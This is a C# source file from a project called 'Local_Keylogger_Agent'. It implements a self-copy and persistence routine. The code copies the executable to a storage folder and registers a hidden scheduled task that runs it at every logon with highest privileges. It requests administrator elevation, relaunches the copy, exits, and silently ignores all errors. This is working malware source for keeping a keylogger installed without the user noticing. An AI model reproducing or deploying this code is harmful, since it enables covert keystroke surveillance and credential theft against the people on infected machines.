using System.Diagnostics;

namespace Local_Keylogger_Agent
{
    internal class SelfCopy
    {
        private string taskName;
        public void CopySelfToStartup()
        {
            try
            {
                string exePath = Application.ExecutablePath;
                string appDirectory = Path.GetDirectoryName(exePath);
                string fileName = Path.GetFileName(exePath);
                string destinationPath = Path.Combine(Storage.KeyLogerCopyPath, fileName);

                if (!File.Exists(destinationPath))
                {
                    File.Copy(exePath, destinationPath, true); // Copy the executable to the target directory
                }
                else
                    return; // If the file already exists, do nothing

                taskName = Path.GetFileNameWithoutExtension(fileName);

                RegisterScheduledTask(destinationPath);
            }
            catch (Exception)
            {
                //Ignore any exceptions that occur during the copy or task registration
            }
        }
        private void RegisterScheduledTask(string exeFilePath)
        {
            string args = $"/Create /TN \"{taskName}\" " +
                          $"/TR \"\\\"{exeFilePath}\\\"\" " +
                          "/SC ONLOGON /RL HIGHEST /F";

            var psi = new ProcessStartInfo
            {
                FileName = "schtasks",
                Arguments = args,
                UseShellExecute = true,
                Verb = "runas", // Run as administrator
                WindowStyle = ProcessWindowStyle.Hidden,
            };

            Process process = Process.Start(psi);
            process?.WaitForExit();

            try
            {
                var psi2 = new ProcessStartInfo
                {
                    FileName = exeFilePath,
                    UseShellExecute = false,
                    //Verb = "runas",
                };


                Process.Start(psi2);
                Environment.Exit(0); // Exit the current process after starting the new one
            }
            catch (Exception)
            {
                //Ignore any exceptions that occur during the start of the new process
            }
        }
    }
}
